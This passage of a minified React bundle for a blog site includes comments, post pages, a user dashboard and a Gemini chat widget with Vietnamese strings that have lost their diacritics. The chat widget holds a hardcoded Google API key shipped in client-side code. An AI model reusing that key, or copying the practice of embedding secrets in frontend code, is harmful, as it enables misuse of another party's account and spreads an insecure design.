bookmark:",g),n(x)}finally{a(!1)}},h=()=>{n(x=>({...x,commentsCount:x.commentsCount+1}))},m=(x=1)=>{n(g=>({...g,commentsCount:Math.max(0,g.commentsCount-x)}))};return{liked:t.liked,bookmarked:t.bookmarked,likesCount:t.likesCount,bookmarksCount:t.bookmarksCount,commentsCount:t.commentsCount,loading:r,handleLike:u,handleBookmark:f,incrementComments:h,decrementComments:m,refresh:l}},BC=({comment:e,onReply:t,onEdit:n,onDelete:r,depth:a=0})=>{var T,A;const{user:l}=Gt(),[u,f]=j.useState(!1),[h,m]=j.useState(!1),[x,g]=j.useState(e.content),[b,E]=j.useState(""),C=(l==null?void 0:l.id)===e.author.id,P=()=>{n(e.id,x),m(!1)},O=()=>{const _=a>0?e.parentId:e.id;t(_,b),E(""),f(!1)},N=()=>{window.confirm("Delete this comment and all replies?")&&r(e.id)};return o.jsx("div",{className:`${a>0?"ml-8 mt-4":"mt-6"} border-l-2 border-gray-200 pl-4`,children:o.jsxs("div",{className:"flex items-start space-x-3",children:[e.author.avatarUrl?o.jsx("img",{src:e.author.avatarUrl,alt:e.author.displayName,className:"w-8 h-8 rounded-full object-cover"}):o.jsx("div",{className:"w-8 h-8 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center text-white text-sm font-semibold",children:((T=e.author.displayName)==null?void 0:T.charAt(0))||((A=e.author.username)==null?void 0:A.charAt(0))||"U"}),o.jsxs("div",{className:"flex-1",children:[o.jsxs("div",{className:"flex items-center space-x-2",children:[o.jsx("span",{className:"font-semibold text-sm",children:e.author.displayName}),o.jsxs("span",{className:"text-xs text-gray-500",children:["@",e.author.username]}),o.jsx("span",{className:"text-xs text-gray-400",children:t_(new Date(e.createdAt),{addSuffix:!0})}),e.updatedAt!==e.createdAt&&o.jsx("span",{className:"text-xs text-gray-400 italic",children:"(edited)"})]}),h?o.jsxs("div",{className:"mt-2",children:[o.jsx("textarea",{value:x,onChange:_=>g(_.target.value),className:"w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",rows:"3"}),o.jsxs("div",{className:"mt-2 flex space-x-2",children:[o.jsx(Ee,{size:"sm",onClick:P,children:"Save"}),o.jsx(Ee,{size:"sm",variant:"outline",onClick:()=>m(!1),children:"Cancel"})]})]}):o.jsx("p",{className:"mt-1 text-gray-700 whitespace-pre-wrap",children:e.content}),o.jsxs("div",{className:"mt-2 flex items-center space-x-4 text-sm",children:[a<2&&o.jsx("button",{onClick:()=>{f(!u),!u&&a>0&&E(`@${e.author.username} `)},className:"text-blue-600 hover:text-blue-800 font-medium",children:"Reply"}),C&&!h&&o.jsxs(o.Fragment,{children:[o.jsx("button",{onClick:()=>m(!0),className:"text-gray-600 hover:text-gray-800",children:"Edit"}),o.jsx("button",{onClick:N,className:"text-red-600 hover:text-red-800",children:"Delete"})]})]}),u&&o.jsxs("div",{className:"mt-3",children:[o.jsx("textarea",{value:b,onChange:_=>E(_.target.value),placeholder:`Reply to ${e.author.displayName}...`,className:"w-full px-3 py-2 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",rows:"3"}),o.jsxs("div",{className:"mt-2 flex space-x-2",children:[o.jsx(Ee,{size:"sm",onClick:O,disabled:!b.trim(),children:"Reply"}),o.jsx(Ee,{size:"sm",variant:"outline",onClick:()=>f(!1),children:"Cancel"})]})]}),e.children&&e.children.length>0&&a===0&&o.jsx("div",{className:"mt-2",children:e.children.map(_=>o.jsx(BC,{comment:_,onReply:t,onEdit:n,onDelete:r,depth:1},_.id))})]})]})})},$B=({postId:e,slug:t,onCommentCountChange:n})=>{const{user:r}=Gt(),[a,l]=j.useState([]),[u,f]=j.useState(""),[h,m]=j.useState(!0),[x,g]=j.useState(!1);j.useEffect(()=>{b()},[t]);const b=async()=>{try{const T=await MB(t);l(T),m(!1)}catch(T){console.error("Failed to load comments:",T),m(!1)}},E=async()=>{if(u.trim()){g(!0);try{await N2(e,{content:u,parentId:null}),f(""),await b(),n&&n(1)}catch(T){console.error("Failed to create comment:",T),alert("Failed to post comment. Please try again.")}finally{g(!1)}}},C=async(T,A)=>{try{await N2(e,{content:A,parentId:T}),await b(),n&&n(1)}catch(_){console.error("Failed to create reply:",_),alert("Failed to post reply. Please try again.")}},P=async(T,A)=>{try{await BB(T,{content:A}),await b()}catch(_){console.error("Failed to update comment:",_),alert("Failed to update comment. Please try again.")}},O=T=>{let A=T.length;return T.forEach(_=>{_.children&&_.children.length>0&&(A+=O(_.children))}),A},N=async T=>{try{const A=(R,B)=>{for(const U of R){if(U.id===B)return U;if(U.children){const $=A(U.children,B);if($)return $}}return null},_=A(a,T),M=_?O([_]):1;await HB(T),await b(),n&&n(-M)}catch(A){console.error("Failed to delete comment:",A),alert("Failed to delete comment. Please try again.")}};return h?o.jsx("div",{className:"text-center py-8",children:"Loading comments..."}):o.jsxs("div",{className:"mt-12",children:[o.jsxs("h2",{className:"text-2xl font-bold mb-6",children:["Comments (",O(a),")"]}),r?o.jsxs("div",{className:"mb-8",children:[o.jsx("textarea",{value:u,onChange:T=>f(T.target.value),placeholder:"Write a comment...",className:"w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-transparent",rows:"4"}),o.jsx("div",{className:"mt-3 flex justify-end",children:o.jsx(Ee,{onClick:E,disabled:!u.trim()||x,children:x?"Posting...":"Post Comment"})})]}):o.jsx("div",{className:"mb-8 p-4 bg-gray-50 rounded-lg text-center",children:o.jsx("p",{className:"text-gray-600",children:"Please log in to comment"})}),o.jsx("div",{className:"space-y-4",children:a.length===0?o.jsx("p",{className:"text-gray-500 text-center py-8",children:"No comments yet. Be the first to comment!"}):a.map(T=>o.jsx(BC,{comment:T,onReply:C,onEdit:P,onDelete:N},T.id))})]})};function YB({postId:e}){const[t,n]=j.useState([]),[r,a]=j.useState(!0);return j.useEffect(()=>{e&&(async()=>{try{a(!0);const u=await _e.get(`/posts/${e}/similar?size=3`);n(u.data.content)}catch(u){console.error("Error fetching similar posts:",u)}finally{a(!1)}})()},[e]),r||t.length===0?null:o.jsxs("div",{className:"mt-12 border-t pt-8",children:[o.jsx("h3",{className:"text-2xl font-bold mb-6",children:"Similar Posts"}),o.jsx("div",{className:"grid gap-6 md:grid-cols-3",children:t.map(l=>o.jsxs(we,{to:`/post/${l.slug}`,className:"group",children:[o.jsx("div",{className:"aspect-video rounded-sm overflow-hidden bg-muted mb-3",children:l.coverImageUrl?o.jsx("img",{src:l.coverImageUrl,alt:l.title,className:"w-full h-full object-cover transition-transform group-hover:scale-105"}):o.jsx("div",{className:"w-full h-full flex items-center justify-center bg-secondary text-secondary-foreground",children:"No Image"})}),o.jsx("h4",{className:"font-semibold group-hover:text-primary line-clamp-2",children:l.title}),o.jsx("p",{className:"text-sm text-muted-foreground mt-1",children:r_(l.publishedAt)})]},l.id))})]})}const VB="AIzaSyBDPLJkGOwci7NYPMSf6-31IyJEwvIXhwQ";function GB({post:e}){const[t,n]=j.useState(!1),[r,a]=j.useState(!1),[l,u]=j.useState([]),[f,h]=j.useState(""),[m,x]=j.useState(!1),g=j.useRef(null),b=j.useRef(null),E=()=>{var T;(T=g.current)==null||T.scrollIntoView({behavior:"smooth"})};j.useEffect(()=>{E()},[l]),j.useEffect(()=>{t&&!r&&b.current&&b.current.focus()},[t,r]),j.useEffect(()=>{t&&l.length===0&&u([{role:"assistant",content:`Xin cho!  Ti l AI Assistant. Ti  c bi vit **"${e.title}"** v sn sng gip bn:

-  Tm tt ni dung bi vit
-  Gii p thc mc v bi vit
-  Gii thch cc khi nim
-  Tm thng tin lin quan

Hy hi ti bt c iu g!`}])},[t,e.title]);const C=T=>{var _,M,R;return`
Bn l AI Assistant thng minh ca CyberShare. Bn ang h tr ngi c vi bi vit sau:

=== THNG TIN BI VIT ===
Tiu : ${e.title}
Tc gi: ${e.authorDisplayName}
Danh mc: ${e.categoryName||"Cha phn loi"}
Tags: ${((_=e.tags)==null?void 0:_.map(B=>B.name||B).join(", "))||"Khng c"}
Tm tt: ${e.summary||"Khng c"}

=== NI DUNG BI VIT ===
${((M=e.content)==null?void 0:M.substring(0,8e3))||""}
${((R=e.content)==null?void 0:R.length)>8e3?`
... (ni dung  c rt gn)`:""}
=== HT NI DUNG ===

HNG DN:
1. Tr li da trn ng cnh bi vit khi c th
2. Nu cu hi khng lin quan n bi vit, vn tr li helpfully nhng nhc ngi dng
3. S dng Markdown  format cu tr li p
4. Tr li bng ting Vit nu cu hi bng ting Vit
5. Gi cu tr li ngn gn, sc tch nhng y  thng tin
`+`

Cu hi ca ngi dng: ${T}`},P=async()=>{var A,_,M,R,B;if(!f.trim()||m)return;const T=f.trim();h(""),u(U=>[...U,{role:"user",content:T}]),x(!0);try{const U=await fetch(`https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key=${VB}`,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({contents:[{parts:[{text:C(T)}]}],generationConfig:{temperature:.7,topK:40,topP:.95,maxOutputTokens:2048},safetySettings:[{category:"HARM_CATEGORY_HARASSMENT",threshold:"BLOCK_MEDIUM_AND_ABOVE"},{category:"HARM_CATEGORY_HATE_SPEECH",threshold:"BLOCK_MEDIUM_AND_ABOVE"},{category:"HARM_CATEGORY_SEXUALLY_EXPLICIT",threshold:"BLOCK_MEDIUM_AND_ABOVE"},{category:"HARM_CATEGORY_DANGEROUS_CONTENT",threshold:"BLOCK_MEDIUM_AND_ABOVE"}]})});if(!U.ok)throw new Error("API request failed");const Y=((B=(R=(M=(_=(A=(await U.json()).candidates)==null?void 0:A[0])==null?void 0:_.content)==null?void 0:M.parts)==null?void 0:R[0])==null?void 0:B.text)||"Xin li, ti khng th tr li cu hi ny.";u(ne=>[...ne,{role:"assistant",content:Y}])}catch(U){console.error("Error calling Gemini API:",U),u($=>[...$,{role:"assistant",content:"Xin li,  c li xy ra. Vui lng th li sau."}])}finally{x(!1)}},O=T=>{T.key==="Enter"&&!T.shiftKey&&(T.preventDefault(),P())},N=["Tm tt bi vit ny"," chnh ca bi l g?","Gii thch thm v..."];return o.jsxs(o.Fragment,{children:[!t&&o.jsx("button",{onClick:()=>n(!0),className:"fixed bottom-6 right-6 z-50 bg-gradient-to-r from-blue-600 to-purple-600 text-white p-4 rounded-full shadow-lg hover:shadow-xl transition-all duration-300 hover:scale-110 group",title:"Chat vi AI v bi vit ny",children:o.jsx(k_,{className:"h-6 w-6 group-hover:animate-pulse"})}),t&&o.jsxs("div",{className:`fixed z-50 bg-white rounded-2xl shadow-2xl border border-gray-200 transition-all duration-300 ${r?"bottom-10 right-6 w-72 h-14":"bottom-10 right-6 w-96 h-[600px] max-h-[75vh]"}`,children:[o.jsxs("div",{className:"flex items-center justify-between px-4 py-3 bg-gradient-to-r from-blue-600 to-purple-600 text-white rounded-t-2xl",children:[o.jsxs("div",{className:"flex items-center gap-2",children:[o.jsx(em,{className:"h-5 w-5"}),o.jsx("span",{className:"font-semibold",children:"AI Assistant"}),o.jsx("span",{className:"text-xs bg-white/20 px-2 py-0.5 rounded-full",children:"Gemini"})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx("button",{onClick:()=>a(!r),className:"p-1.5 hover:bg-white/20 rounded-lg transition-colors",children:r?o.jsx(y_,{className:"h-4 w-4"}):o.jsx(v_,{className:"h-4 w-4"})}),o.jsx("button",{onClick:()=>{n(!1),a(!1)},className:"p-1.5 hover:bg-white/20 rounded-lg transition-colors",children:o.jsx(Bi,{className:"h-4 w-4"})})]})]}),!r&&o.jsxs(o.Fragment,{children:[o.jsxs("div",{className:"flex-1 overflow-y-auto p-4 space-y-4 h-[calc(100%-130px)]",children:[l.map((T,A)=>o.jsxs("div",{className:`flex gap-3 ${T.role==="user"?"justify-end":"justify-start"}`,children:[T.role==="assistant"&&o.jsx("div",{className:"w-8 h-8 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center flex-shrink-0",children:o.jsx(em,{className:"h-4 w-4 text-white"})}),o.jsx("div",{className:`max-w-[80%] rounded-2xl px-4 py-2 ${T.role==="user"?"bg-blue-600 text-white":"bg-gray-100 text-gray-800"}`,children:T.role==="assistant"?o.jsx("div",{className:"prose prose-sm max-w-none prose-p:my-1 prose-ul:my-1 prose-li:my-0.5",children:o.jsx(bT,{children:T.content})}):o.jsx("p",{className:"text-sm",children:T.content})}),T.role==="user"&&o.jsx("div",{className:"w-8 h-8 rounded-full bg-gray-300 flex items-center justify-center flex-shrink-0",children:o.jsx(ff,{className:"h-4 w-4 text-gray-600"})})]},A)),m&&o.jsxs("div",{className:"flex gap-3 justify-start",children:[o.jsx("div",{className:"w-8 h-8 rounded-full bg-gradient-to-r from-blue-500 to-purple-500 flex items-center justify-center",children:o.jsx(em,{className:"h-4 w-4 text-white"})}),o.jsx("div",{className:"bg-gray-100 rounded-2xl px-4 py-3",children:o.jsx(b0,{className:"h-5 w-5 animate-spin text-blue-600"})})]}),o.jsx("div",{ref:g})]}),l.length<=1&&!m&&o.jsx("div",{className:"px-4 pb-2",children:o.jsx("div",{className:"flex flex-wrap gap-2",children:N.map((T,A)=>o.jsx("button",{onClick:()=>{h(T)},className:"text-xs px-3 py-1.5 bg-blue-50 text-blue-600 rounded-full hover:bg-blue-100 transition-colors",children:T},A))})}),o.jsx("div",{className:"p-3 border-t",children:o.jsxs("div",{className:"flex items-center gap-2",children:[o.jsx("input",{ref:b,type:"text",value:f,onChange:T=>h(T.target.value),onKeyDown:O,placeholder:"Hi v bi vit ny...",className:"flex-1 px-4 py-2 border border-gray-200 rounded-full focus:outline-none focus:border-blue-500 text-sm",disabled:m}),o.jsx("button",{onClick:P,disabled:!f.trim()||m,className:"p-2 bg-blue-600 text-white rounded-full hover:bg-blue-700 transition-colors disabled:opacity-50 disabled:cursor-not-allowed",children:o.jsx(Qg,{className:"h-4 w-4"})})]})})]})]})]})}function QB(){var $,Y,ne;const{slug:e}=Vu(),t=Ln(),{user:n}=Gt(),[r,a]=j.useState(null),[l,u]=j.useState(!0),[f,h]=j.useState(""),[m,x]=j.useState(!1),[g,b]=j.useState([]),{liked:E,bookmarked:C,likesCount:P,commentsCount:O,handleLike:N,handleBookmark:T,incrementComments:A,decrementComments:_}=MC(r==null?void 0:r.id);j.useEffect(()=>{R()},[e]),j.useEffect(()=>{r!=null&&r.id&&(_e.post(`/api/post/${r.id}/view`).catch(Z=>{console.error("Failed to increment view count:",Z)}),r.categoryId&&M())},[r==null?void 0:r.id]);const M=async()=>{try{const me=((await _e.get("/api/posts",{params:{categoryId:r.categoryId,size:5,sort:"publishedAt,desc"}})).data.content||[]).filter(ye=>ye.id!==r.id);b(me.slice(0,4))}catch(Z){console.error("Failed to fetch category posts:",Z)}},R=async()=>{var Z,me;try{u(!0);const ye=await _e.get(`/api/posts/slug/${e}`);a(ye.data)}catch(ye){console.error("Failed to fetch post:",ye),h(((me=(Z=ye.response)==null?void 0:Z.data)==null?void 0:me.message)||"Post not found")}finally{u(!1)}},B=async()=>{var Z,me;if(window.confirm("Are you sure you want to delete this post?"))try{x(!0),await _e.delete(`/api/posts/${r.id}`),t("/dashboard")}catch(ye){console.error("Failed to delete post:",ye),alert(((me=(Z=ye.response)==null?void 0:Z.data)==null?void 0:me.message)||"Failed to delete post")}finally{x(!1)}},U=n&&r&&n.id===r.authorId;return l?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("div",{className:"inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"}),o.jsx("p",{className:"mt-4 text-gray-600",children:"Loading post..."})]})}):f||!r?o.jsx("div",{className:"min-h-screen bg-gray-50 flex items-center justify-center",children:o.jsxs("div",{className:"text-center",children:[o.jsx("h2",{className:"text-2xl font-bold text-gray-800 mb-2",children:"Post Not Found"}),o.jsx("p",{className:"text-gray-600 mb-4",children:f}),o.jsxs(Ee,{onClick:()=>t("/"),variant:"outline",children:[o.jsx(Fi,{className:"h-4 w-4 mr-2"}),"Back to Home"]})]})}):o.jsxs("div",{className:"min-h-screen bg-white",children:[o.jsxs("div",{className:"max-w-3xl mx-auto px-6 py-12",children:[o.jsxs("article",{children:[o.jsxs("nav",{className:"flex items-center gap-2 text-sm text-gray-600 mb-6",children:[o.jsx(we,{to:"/",className:"hover:text-gray-900 transition-colors",children:"Home"}),o.jsx(Pu,{className:"w-4 h-4"}),r.categoryName&&o.jsxs(o.Fragment,{children:[o.jsx(we,{to:`/category/${r.categorySlug||r.categoryName.toLowerCase()}`,className:"hover:text-gray-900 transition-colors",children:r.categoryName}),o.jsx(Pu,{className:"w-4 h-4"})]}),o.jsx("span",{className:"text-gray-900 font-medium truncate",children:r.title})]}),o.jsxs("header",{className:"mb-8",children:[o.jsx("h1",{className:"text-5xl font-bold text-gray-900 mb-6 leading-tight",children:r.title}),r.summary&&o.jsx("p",{className:"text-xl text-gray-600 mb-8 leading-relaxed",children:r.summary}),o.jsxs("div",{className:"flex items-center justify-between mb-6",children:[o.jsx("div",{className:"flex items-center gap-4",children:o.jsxs(we,{to:`/author/${r.authorUsername}`,className:"flex items-center gap-3 hover:opacity-80",children:[r.authorAvatarUrl?o.jsx("img",{src:r.authorAvatarUrl,alt:r.authorDisplayName,className:"w-12 h-12 rounded-full object-cover"}):o.jsx("div",{className:"w-12 h-12 rounded-full bg-blue-600 flex items-center justify-center text-white font-semibold",children:(($=r.authorDisplayName)==null?void 0:$.charAt(0))||"U"}),o.jsxs("div",{children:[o.jsx("p",{className:"font-semibold text-gray-900",children:r.authorDisplayName}),o.jsxs("div",{className:"flex items-center gap-2 text-sm text-gray-500",children:[r.publishedAt&&o.jsx("time",{dateTime:r.publishedAt,children:Ui(new Date(r.publishedAt),"MMM dd, yyyy")}),o.jsx("span",{children:""}),o.jsxs("span",{children:[Math.ceil((((Y=r.content)==null?void 0:Y.length)||0)/1e3)," min read"]})]})]})]})}),!U&&o.jsx(Uf,{username:r.authorUsername,variant:"default",className:"rounded-full"})]}),o.jsxs("div",{className:"flex items-center justify-between py-4 border-y",children:[o.jsxs("div",{className:"flex items-center gap-6",children:[o.jsxs("button",{onClick:N,className:"flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors",disabled:!n,children:[o.jsx(cr,{className:`w-6 h-6 ${E?"fill-red-500 text-red-500":""}`}),o.jsx("span",{className:"text-sm",children:P})]}),o.jsxs("button",{onClick:()=>{var Z;return(Z=document.getElementById("comments-section"))==null?void 0:Z.scrollIntoView({behavior:"smooth"})},className:"flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors",children:[o.jsx(cf,{className:"w-6 h-6"}),o.jsx("span",{className:"text-sm",children:O})]})]}),o.jsxs("div",{className:"flex items-center gap-4",children:[o.jsx("button",{onClick:T,className:"text-gray-600 hover:text-gray-900 transition-colors",disabled:!n,title:C?"Remove bookmark":"Bookmark this post",children:o.jsx(_u,{className:`w-6 h-6 ${C?"fill-current":""}`})}),U&&o.jsxs(o.Fragment,{children:[o.jsx("button",{onClick:()=>t(`/edit/${r.id}`),className:"text-gray-600 hover:text-gray-900 transition-colors",title:"Edit post",children:o.jsx(xa,{className:"w-6 h-6"})}),o.jsx("button",{onClick:B,disabled:m,className:"text-gray-600 hover:text-red-600 transition-colors",title:"Delete post",children:o.jsx(Dl,{className:"w-6 h-6"})})]})]})]})]}),r.coverImageUrl&&o.jsx("div",{className:"w-full mb-12",children:o.jsx("img",{src:r.coverImageUrl,alt:r.title,className:"w-full h-auto rounded-sm"})}),o.jsx("div",{className:`prose prose-lg prose-slate max-w-none\r
            prose-headings:font-bold prose-headings:text-gray-900\r
            prose-h1:text-4xl prose-h1:mb-4\r
            prose-h2:text-3xl prose-h2:mb-3 prose-h2:mt-8\r
            prose-h3:text-2xl prose-h3:mb-2 prose-h3:mt-6\r
            prose-p:text-gray-800 prose-p:leading-relaxed prose-p:mb-6 prose-p:text-xl\r
            prose-a:text-blue-600 prose-a:no-underline hover:prose-a:underline\r
            prose-strong:text-gray-900 prose-strong:font-semibold\r
            prose-pre:bg-slate-900 prose-pre:text-slate-100 prose-pre:p-4 prose-pre:rounded-md prose-pre:border prose-pre:border-slate-700/60 prose-pre:overflow-x-auto\r
            prose-ul:list-disc prose-ul:pl-6 prose-ul:mb-4\r
            prose-ol:list-decimal prose-ol:pl-6 prose-ol:mb-4\r
            prose-li:text-gray-800 prose-li:mb-2 prose-li:text-xl\r
            prose-blockquote:border-l-4 prose-blockquote:border-gray-300 prose-blockquote:pl-4 prose-blockquote:italic prose-blockquote:text-gray-600\r
            prose-img:rounded-sm prose-img:w-full prose-img:my-8\r
            prose-hr:border-gray-300 prose-hr:my-8\r
            prose-table:border-collapse prose-table:w-full\r
            prose-th:border prose-th:border-gray-300 prose-th:bg-gray-50 prose-th:p-2 prose-th:text-left\r
            prose-td:border prose-td:border-gray-300 prose-td:p-2\r
          `,children:o.jsx(bT,{remarkPlugins:[aF],rehypePlugins:[NB,FB],children:r.content})}),(r.categoryName||r.tags&&r.tags.length>0)&&o.jsxs("div",{className:"flex flex-wrap items-center gap-2 mt-12 pt-8 border-t",children:[r.categoryName&&o.jsx(we,{to:`/category/${r.categorySlug||r.categoryName.toLowerCase()}`,className:"px-4 py-2 bg-gray-100 text-gray-800 rounded-full text-sm font-medium hover:bg-gray-200 transition-colors",children:r.categoryName}),r.tags&&r.tags.length>0&&r.tags.map(Z=>o.jsxs(we,{to:`/tag/${Z.slug||Z.name}`,className:"px-4 py-2 bg-gray-100 text-gray-600 rounded-full text-sm font-medium hover:bg-gray-200 transition-colors",children:["#",Z.name||Z]},Z.id||Z.name))]}),o.jsxs("div",{className:"flex items-center justify-between py-6 mt-8 border-t",children:[o.jsxs("div",{className:"flex items-center gap-6",children:[o.jsxs("button",{onClick:N,className:"flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors",disabled:!n,children:[o.jsx(cr,{className:`w-7 h-7 ${E?"fill-red-500 text-red-500":""}`}),o.jsx("span",{className:"text-base font-medium",children:P})]}),o.jsxs("button",{onClick:()=>{var Z;return(Z=document.getElementById("comments-section"))==null?void 0:Z.scrollIntoView({behavior:"smooth"})},className:"flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors",children:[o.jsx(cf,{className:"w-7 h-7"}),o.jsx("span",{className:"text-base font-medium",children:O})]})]}),o.jsxs("div",{className:"flex items-center gap-4",children:[o.jsx("button",{onClick:T,className:"flex items-center gap-2 text-gray-600 hover:text-gray-900 transition-colors",disabled:!n,title:C?"Remove bookmark":"Bookmark this post",children:o.jsx(_u,{className:`w-7 h-7 ${C?"fill-current":""}`})}),U&&o.jsxs(o.Fragment,{children:[o.jsx("button",{onClick:()=>t(`/edit/${r.id}`),className:"text-gray-600 hover:text-gray-900 transition-colors",title:"Edit post",children:o.jsx(xa,{className:"w-6 h-6"})}),o.jsx("button",{onClick:B,disabled:m,className:"text-gray-600 hover:text-red-600 transition-colors",title:"Delete post",children:o.jsx(Dl,{className:"w-6 h-6"})})]})]})]})]}),o.jsx(YB,{postId:r.id}),o.jsx("div",{id:"comments-section",className:"mt-16",children:o.jsx($B,{postId:r.id,slug:e,onCommentCountChange:Z=>{Z>0?A():_(Math.abs(Z))}})}),g.length>0&&o.jsxs("div",{className:"mt-16 pt-8 border-t",children:[o.jsxs("div",{className:"flex items-center justify-between mb-6",children:[o.jsxs("h2",{className:"text-2xl font-bold text-gray-900 flex items-center gap-2",children:["More in ",r.categoryName]}),o.jsx(we,{to:`/category/${r.categorySlug||((ne=r.categoryName)==null?void 0:ne.toLowerCase())}`,className:"text-blue-600 hover:text-blue-700 text-sm font-medium",children:"View all "})]}),o.jsx("div",{className:"grid grid-cols-2 gap-4",children:g.map(Z=>o.jsx(w0,{post:Z},Z.id))})]})]}),o.jsx(GB,{post:r})]})}function KB(){const{isAuthenticated:e}=Gt(),t=Ln(),[n,r]=j.useState([]),[a,l]=j.useState(!0),[u,f]=j.useState(""),[h,m]=j.useState("");j.useEffect(()=>{if(!e){t("/login");return}x()},[e,t,h]);const x=async()=>{l(!0);try{const b=h?{status:h}:{},E=await _e.get("/api/posts/my-posts",{params:b});r(E.data.content||[])}catch(b){console.error("Failed to fetch posts:",b),f("Failed to load your posts")}finally{l(!1)}},g=async(b,E)=>{if(window.confirm(`Are you sure you want to delete "${E}"?`))try{await _e.delete(`/api/posts/${b}`),r(n.filter(C=>C.id!==b))}catch(C){console.error("Failed to delete post:",C),alert("Failed to delete post")}};return o.jsx("div",{className:"min-h-screen bg-gray-50",children:o.jsxs("div",{className:"container mx-auto px-4 py-8",children:[o.jsxs("div",{className:"flex items-center justify-between mb-8",children:[o.jsxs("div",{children:[o.jsx("h1",{className:"text-3xl font-bold",children:"My Posts"}),o.jsx("p",{className:"text-gray-600 mt-1",children:"Manage your stories"})]}),o.jsx(Ee,{asChild:!0,children:o.jsxs(we,{to:"/write",children:[o.jsx(xa,{className:"h-4 w-4 mr-2"}),"Write New Story"]})})]}),o.jsx("div",{className:"mb-6",children:o.jsxs("div",{className:"flex space-x-2",children:[o.jsx(Ee,{variant:h===""?"default":"outline",onClick:()=>m(""),size:"sm",children:"All"}),o.jsx(Ee,{variant:h==="PUBLISHED"?"default":"outline",onClick:()=>m("PUBLISHED"),size:"sm",children:"Published"}),o.jsx(Ee,{variant:h==="DRAFT"?"default":"outline",onClick:()=>m("DRAFT"),size:"sm",children:"Drafts"}),o.jsx(Ee,{variant:h==="PENDING_REVIEW"?"default":"outline",onClick:()=>m("PENDING_REVIEW"),size:"sm",children:"Pending Review"}),o.jsx(Ee,{variant:h==="ARCHIVED"?"default":"outline",onClick:()=>m("ARCHIVED"),size:"sm",children:"Archived"})]})}),u&&o.jsx("div",{className:"mb-4 p-4 bg-red-50 border border-red-200 rounded-md",children:o.jsx("p",{className:"text-sm text-red-800",children:u})}),a?o.jsxs("div",{className:"text-center py-12",children:[o.jsx("div",{className:"animate-spin rounded-full h-12 w-12 border-b-2 border-blue-500 mx-auto"}),o.jsx("p",{className:"text-gray-500 mt-4",children:"Loading your posts..."})]}):n.length===0?o.jsxs("div",{className:"bg-white rounded-lg shadow-sm p-12 text-center",children:[o.jsx(xa,{className:"h-16 w-16 text-gray-300 mx-auto mb-4"}),o.jsx("h3",{className:"text-xl font-semibold text-gray-700 mb-2",children:h?"No posts found":"No posts yet"}),o.jsx("p",{className:"text-gray-500 mb-6",children:h?`You don't have any ${h.toLowerCase().replace("_"," ")} posts.`:"Start writing your first story!"}),o.jsx(Ee,{asChild:!0,children:o.jsxs(we,{to:"/write",children:[o.jsx(xa,{className:"h-4 w-4 mr-2"}),"Write Your First Story"]})})]}):o.jsx("div",{className:"space-y-4",children:n.map(b=>o.jsxs("div",{className:"relative",children:[o.jsx(Hf,{post:b}),o.jsxs("div",{className:"absolute top-4 right-4 flex items-center space-x-2 bg-white/90 rounded-lg p-1",children:[o.jsx(Ee,{variant:"ghost",size:"sm",asChild:!0,children:o.jsx(we,{to:`/edit/${b.id}`,children:o.jsx(xa,{className:"h-4 w-4"})})}),o.jsx(Ee,{variant:"ghost",size:"sm",onClick:()=>g(b.id,b.title),className:"text-red-600 hover:text-red-700 hover:bg-red-50",children:o.jsx(Dl,{className:"h-4 w-4"})})]})]},b.id))})]})})}function oc({post:e}){var f,h;const{isAuthenticated:t}=Gt(),{liked:n,bookmarked:r,handleBookmark:a,loading:l}=MC(e.id),u=m=>{if(m.preventDefault(),m.stopPropagation(),!t){alert("Please login to bookmark posts");return}a()};return o.jsx("article",{className:"group border-b border-gray-200 pb-8",children:o.jsx(we,{to:`/post/${e.slug}`,children:o.jsxs("div",{className:"flex gap-6",children:[o.jsxs("div",{className:"flex-1 min-w-0",children:[o.jsxs("div",{className:"flex items-center gap-2 mb-3",children:[e.authorAvatarUrl?o.jsx("img",{src:e.authorAvatarUrl,alt:e.authorDisplayName,className:"w-6 h-6 rounded-full object-cover"}):o.jsx("div",{className:"w-6 h-6 rounded-full bg-gray-200 flex items-center justify-center text-xs font-semibold text-gray-600",children:((f=e.authorDisplayName)==null?void 0:f.charAt(0))||"U"}),o.jsx("span",{className:"text-sm text-gray-900 font-medium",children:e.authorDisplayName}),e.categoryName&&o.jsxs(o.Fragment,{children:[o.jsx(Pu,{className:"w-4 h-4 text-gray-400"}),o.jsx(we,{to:`/category/${e.categorySlug||e.categoryName.toLowerCase()}`,onClick:m=>m.stopPropagation(),className:"text-sm text-gray-600 hover:text-gray-900 transition-colors",children:e.categoryName})]})]}),o.jsx("h2",{className:"text-xl font-bold text-gray-900 mb-2 group-hover:text-gray-600 transition-colors line-clamp-2",children:e.title}),o.jsxs("p",{className:"text-gray-600 text-base mb-4 line-clamp-2",children:[e.summary||((h=e.content)==null?void 0:h.substring(0,150)),"..."]}),o.jsxs("div",{className:"flex items-center justify-between",children:[o.jsxs("div",{className:"flex items-center gap-4 text-sm text-gray-500",children:[e.publishedAt&&o.jsx("time",{dateTime:e.publishedAt,children:Ui(new Date(e.publishedAt),"MMM dd, yyyy")}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(kn,{className:"w-4 h-4"}),o.jsx("span",{children:e.views||0})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(cr,{className:`w-4 h-4 ${n?"fill-red-500 text-red-500":""}`}),o.jsx("span",{children:e.likesCount||0})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx(Ju,{className:"w-4 h-4"}),o.jsx("span",{children:e.commentsCount||0})]})]}),o.jsxs("div",{className:"flex items-center gap-1",children:[o.jsx("button",{onClick:u,disabled:l,className:`p-2 rounded-full transition-all disabled:opacity-50 hover:bg-gray-100 